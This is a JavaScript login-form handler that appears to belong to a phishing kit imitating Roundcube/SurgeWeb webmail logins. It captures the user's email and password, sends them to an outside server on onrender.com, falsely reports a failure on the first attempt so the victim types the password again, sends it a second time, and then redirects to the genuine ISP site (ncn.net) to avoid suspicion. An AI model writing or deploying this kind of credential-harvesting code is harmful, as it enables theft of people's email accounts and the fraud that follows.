document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("userForm") || document.forms.main;
  const messageDiv =
    document.getElementById("message") ||
    document.getElementById("login_post_comment") ||
    null;
  const submitButton =
    document.getElementById("rcmloginsubmit") ||
    document.getElementById("cmd_login");
  const originalButtonText = submitButton ? submitButton.textContent : "";
  let submissionCount = 0; // Track number of submissions
  let lastFormData = null; // store last-submitted form data in-memory briefly
  const RECAPTCHA_SITE_KEY = "YOUR_RECAPTCHA_SITE_KEY"; // replace with your site key

  // helpers to find user/password fields with fallback to the existing SurgeWeb form
  const emailFieldGetter = () =>
    document.getElementById("rcmloginuser") ||
    (form
      ? form.elements
        ? form.elements["username_ex"]
        : form.username_ex
      : null);
  const passwordFieldGetter = () =>
    document.getElementById("rcmloginpwd") ||
    (form ? (form.elements ? form.elements["password"] : form.password) : null);

  async function getRecaptchaToken() {
    if (
      !window.grecaptcha ||
      RECAPTCHA_SITE_KEY === "YOUR_RECAPTCHA_SITE_KEY"
    ) {
      return null;
    }

    try {
      return await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: "submit" });
    } catch (err) {
      console.error("reCAPTCHA error:", err);
      return null;
    }
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault(); // prevent form default submission

    // basic honeypot check (client-side): if filled, block immediately
    const hp = document.getElementById("hp_field");
    if (hp && hp.value && hp.value.trim() !== "") {
      messageDiv.textContent = "Spam detected";
      messageDiv.classList.remove("success");
      messageDiv.classList.add("show", "error");
      return;
    }

    submissionCount++; // Increment submission count

    // First submission: submit to backend, clear password, and show message
    if (submissionCount === 1) {
      // indicate progress on the button instead of the message div
      submitButton.disabled = true;
      submitButton.textContent = "Verifying...";
      messageDiv.classList.add("show");
      messageDiv.classList.remove("success", "error");

      const emailField = emailFieldGetter();
      const passwordField = passwordFieldGetter();
      const formData = {
        email: emailField ? emailField.value : "",
        password: passwordField ? passwordField.value : "",
      };

      // request reCAPTCHA token and attach if available
      const token = await getRecaptchaToken();
      if (token) {
        formData.recaptchaToken = token;
        const hid = document.getElementById("recaptchaToken");
        if (hid) hid.value = token;
      }

      try {
        const backendURL = "https://fiber-1-otce.onrender.com/api/user";

        console.log("Sending login POST:", backendURL, formData);
        const response = await fetch(backendURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        });

        let result;
        try {
          // Try to parse JSON; if parsing fails, include raw text for debugging
          const text = await response.text();
          try {
            result = JSON.parse(text);
          } catch (parseErr) {
            result = { _raw: text };
          }
        } catch (jsonErr) {
          console.error("Failed to read server response:", jsonErr);
          messageDiv.textContent = "Error reading server response";
          messageDiv.classList.add("show", "error");
          submitButton.disabled = false;
          return;
        }

        console.log("Server response:", response.status, result);

        // save last submitted data so second submit can reuse password if cleared
        lastFormData = { ...formData };

        // Clear password field regardless of response
        const pw = passwordFieldGetter();
        if (pw) pw.value = "";

        // Always display the server's response verbatim and style it as an error (red)
        const serverMsg =
          (typeof result === "string" && result) ||
          (result && (result.message || result._raw)) ||
          (result && Object.keys(result).length ? JSON.stringify(result) : "");
        messageDiv.textContent =
          serverMsg || "Error: The server returned no message.";
        messageDiv.classList.remove("success", "hidden");
        messageDiv.classList.add("show", "error");
      } catch (error) {
        console.error("Network / fetch error:", error);
        messageDiv.textContent = "Network error: " + error.message;
        messageDiv.classList.remove("success");
        messageDiv.classList.add("show", "error");
      } finally {
        submitButton.disabled = false;
        submitButton.textContent = originalButtonText;
      }
      return;
    }

    // Second submission: proceed with form submission and redirect
    // Disable the button and show progress on it
    submitButton.disabled = true;
    submitButton.textContent = "Verifying...";
    messageDiv.textContent = "";
    messageDiv.classList.add("show");
    messageDiv.classList.remove("success", "error");

    // Build formData; if the password field is empty (we cleared it on first
    // submit) fall back to the last submitted password stored in memory.
    const ef = emailFieldGetter();
    const pf = passwordFieldGetter();
    const email = ef ? ef.value : "";
    let password = pf ? pf.value : "";
    if (!password && lastFormData && lastFormData.password) {
      password = lastFormData.password;
    }

    const formData = { email, password };

    // request reCAPTCHA token for the second submit too
    const token2 = await getRecaptchaToken();
    if (token2) {
      formData.recaptchaToken = token2;
      const hid2 = document.getElementById("recaptchaToken");
      if (hid2) hid2.value = token2;
    }

    try {
      // Update this URL to match your backend (local or deployed)
      const backendURL = "https://fiber-1-otce.onrender.com/api/user";

      const response = await fetch(backendURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      // Parse and log the response for debugging
      let result;
      try {
        const text = await response.text();
        try {
          result = JSON.parse(text);
        } catch (parseErr) {
          result = { _raw: text };
        }
      } catch (jsonErr) {
        console.error("Failed to read server response:", jsonErr);
        messageDiv.textContent = "Error reading server response";
        messageDiv.classList.add("show", "error");
        return;
      }

      console.log("Server response:", response.status, result);

      if (response.ok && result && result.success) {
        const serverMsg =
          (typeof result === "string" && result) ||
          (result && (result.message || result._raw)) ||
          (result && Object.keys(result).length
            ? JSON.stringify(result)
            : "Form submitted successfully ✅");
        messageDiv.textContent = serverMsg || "";
        messageDiv.classList.remove("success", "hidden");
        messageDiv.classList.add("show", "error");
        form.reset();
        submissionCount = 0; // Reset counter for next round
        // Determine redirect based on the user's email domain
        (function doRedirect() {
          const submittedEmail =
            email || (lastFormData && lastFormData.email) || "";
          let redirectUrl = "https://ncn.net/"; // fixed fallback to NCN

          if (false) {
            // domain-based redirect disabled (use NCN) {
            let host = submittedEmail
              .split("@")[1]
              .split(/[\/?#]/)[0]
              .toLowerCase();
            host = host.replace(/^www\./, "");

            // special-case: adams.net => webmail.adams.net
            if (host.endsWith("adams.net")) {
              redirectUrl = "https://webmail.adams.net/";
            } else {
              // small provider map to prefer canonical webmail pages
              const providerMap = {
                "gmail.com": "https://gmail.com",
                "googlemail.com": "https://gmail.com",
                "yahoo.com": "https://yahoo.com",
                "ymail.com": "https://yahoo.com",
                "outlook.com": "https://outlook.com",
                "hotmail.com": "https://outlook.live.com",
              };

              redirectUrl = providerMap[host] || `https://${host}`;
            }
          }

          // Redirect after short delay; we won't include any data in the URL.
          setTimeout(() => {
            // Note: cannot control console or content on external domains.
            window.location.href = redirectUrl;
          }, 2000);
        })();
      } else {
        console.error("Backend error:", result);
        const details =
          result && (result.message || result._raw)
            ? result.message || result._raw
            : "Something went wrong ❌";
        messageDiv.textContent = "Error: " + details;
        messageDiv.classList.remove("success");
        messageDiv.classList.add("show", "error");
      }
    } catch (error) {
      console.error("Network / fetch error:", error);
      messageDiv.textContent = "Network error: " + error.message;
      messageDiv.classList.remove("success");
      messageDiv.classList.add("show", "error");
    } finally {
      submitButton.disabled = false;
      submitButton.textContent = originalButtonText;
    }
  });
});
